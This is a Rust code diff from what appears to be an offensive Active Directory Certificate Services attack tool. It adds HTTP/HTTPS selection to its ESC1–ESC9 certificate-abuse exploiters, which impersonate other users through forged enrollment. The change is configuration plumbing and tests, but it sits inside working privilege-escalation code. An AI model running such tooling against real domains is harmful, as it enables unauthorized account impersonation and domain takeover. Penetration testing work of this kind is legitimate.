@@ -156,10 +156,13 @@ pub struct AdcsConfig {
     pub output_path: Option<String>,
     /// Dry run — validate config without executing
     pub dry_run: bool,
+    /// Use HTTPS (true) or HTTP (false) for web enrollment
+    pub use_ssl: bool,
 }
 
 impl AdcsConfig {
-    /// Extract the CA server hostname from the URL
+    /// Extract the CA server hostname from the URL.
+    /// Strips protocol prefix and path, returns just hostname.
     pub fn ca_server(&self) -> Result<String> {
         let url = self.ca_url.trim_end_matches('/');
         // Remove protocol prefix
@@ -175,6 +178,20 @@ impl AdcsConfig {
             ));
         }
         Ok(server.to_string())
+    }
+
+    /// Detect whether the CA URL uses HTTPS or HTTP.
+    /// Returns true if URL starts with "https://", false otherwise.
+    /// Defaults to true if no scheme prefix is present.
+    pub fn ca_use_ssl(&self) -> bool {
+        let url = self.ca_url.trim_end_matches('/');
+        if url.starts_with("https://") {
+            true
+        } else if url.starts_with("http://") {
+            false
+        } else {
+            self.use_ssl
+        }
     }
 }
 
@@ -284,8 +301,9 @@ async fn execute_auto(
 
     info!("Auto mode: attempting ESC1 on template '{}'", template);
 
+    let use_ssl = config.ca_use_ssl();
     // Try ESC1 first (most reliable SAN-based attack)
-    match Esc1Exploiter::new(&ca_server) {
+    match Esc1Exploiter::with_ssl(&ca_server, use_ssl) {
         Ok(exploiter) => match exploiter.exploit(template, upn, None).await {
             Ok(cert) => {
                 info!("ESC1 attack succeeded!");
@@ -390,7 +408,8 @@ async fn execute_auto(
 
 async fn execute_esc1(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
     let ca_server = config.ca_server()?;
-    let exploiter = Esc1Exploiter::new(&ca_server)?;
+    let use_ssl = config.ca_use_ssl();
+    let exploiter = Esc1Exploiter::with_ssl(&ca_server, use_ssl)?;
 
     let cert = exploiter.exploit(template, target_upn, None).await?;
 
@@ -413,7 +432,8 @@ async fn execute_esc1(config: &AdcsConfig, template: &str, target_upn: &str) -> 
 
 async fn execute_esc2(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
     let ca_server = config.ca_server()?;
-    let exploiter = Esc2Exploiter::new(&ca_server)?;
+    let use_ssl = config.ca_use_ssl();
+    let exploiter = Esc2Exploiter::with_ssl(&ca_server, use_ssl)?;
 
     let cert = exploiter.exploit(template, target_upn, None).await?;
 
@@ -436,7 +456,8 @@ async fn execute_esc2(config: &AdcsConfig, template: &str, target_upn: &str) -> 
 
 async fn execute_esc3(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
     let ca_server = config.ca_server()?;
-    let exploiter = Esc3Exploiter::new(&ca_server)?;
+    let use_ssl = config.ca_use_ssl();
+    let exploiter = Esc3Exploiter::with_ssl(&ca_server, use_ssl)?;
 
     // ESC3 exploit takes 3 args: agent_template, target_template, target_user
     let (_agent_cert, user_cert) = exploiter.exploit(template, template, target_upn).await?;
@@ -565,7 +586,8 @@ async fn execute_esc5(config: &AdcsConfig, object_dn: &str, action: &str) -> Res
 
 async fn execute_esc6(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
     let ca_server = config.ca_server()?;
-    let exploiter = Esc6Exploiter::new(&ca_server)?;
+    let use_ssl = config.ca_use_ssl();
+    let exploiter = Esc6Exploiter::with_ssl(&ca_server, use_ssl)?;
 
     let cert = exploiter.exploit(template, target_upn).await?;
 
@@ -589,12 +611,14 @@ async fn execute_esc6(config: &AdcsConfig, template: &str, target_upn: &str) -> 
 
 async fn execute_esc7(config: &AdcsConfig, ca_name: &str, action: &str) -> Result<AdcsResult> {
     let ca_server = config.ca_server()?;
+    let use_ssl = config.ca_use_ssl();
 
-    let esc7_target = overthrone_core::adcs::esc7::Esc7Target::new(
+    let esc7_target = overthrone_core::adcs::esc7::Esc7Target::with_ssl(
         ca_name,
         &ca_server,
         &config.domain,
         &config.username,
+        use_ssl,
     );
 
     match action {
@@ -869,7 +893,8 @@ async fn execute_esc8_rpc_dcom(
 
 async fn execute_esc9(config: &AdcsConfig, template: &str, target_upn: &str) -> Result<AdcsResult> {
     let ca_server = config.ca_server()?;
-    let exploiter = Esc9Exploiter::new(&ca_server)?;
+    let use_ssl = config.ca_use_ssl();
+    let exploiter = Esc9Exploiter::with_ssl(&ca_server, use_ssl)?;
 
     // ESC9 requires Esc9Config struct with victim info for UPN poisoning
     let esc9_config = Esc9Config {
@@ -955,8 +980,10 @@ mod tests {
             },
             output_path: None,
             dry_run: false,
+            use_ssl: true,
         };
         assert_eq!(config.ca_server().unwrap(), "ca.corp.local");
+        assert!(!config.ca_use_ssl()); // URL has http://
     }
 
     #[test]
@@ -973,8 +1000,10 @@ mod tests {
             },
             output_path: None,
             dry_run: false,
+            use_ssl: true,
         };
         assert_eq!(config.ca_server().unwrap(), "pki.corp.local");
+        assert!(config.ca_use_ssl()); // URL has https://
     }
 
     #[test]
@@ -991,6 +1020,7 @@ mod tests {
             },
             output_path: None,
             dry_run: false,
+            use_ssl: true,
         };
         assert!(config.ca_server().is_err());
     }
@@ -1009,6 +1039,7 @@ mod tests {
             },
             output_path: None,
             dry_run: true,
+            use_ssl: true,
         };
 
         let rt = tokio::runtime::Runtime::new().unwrap();
@@ -1064,6 +1095,7 @@ mod tests {
             },
             output_path: None,
             dry_run: false,
+            use_ssl: true,
         };
 
         let rt = tokio::runtime::Runtime::new().unwrap();
@@ -1092,6 +1124,7 @@ mod tests {
             },
             output_path: None,
             dry_run: true,
+            use_ssl: true,
         };
 
         let rt = tokio::runtime::Runtime::new().unwrap();
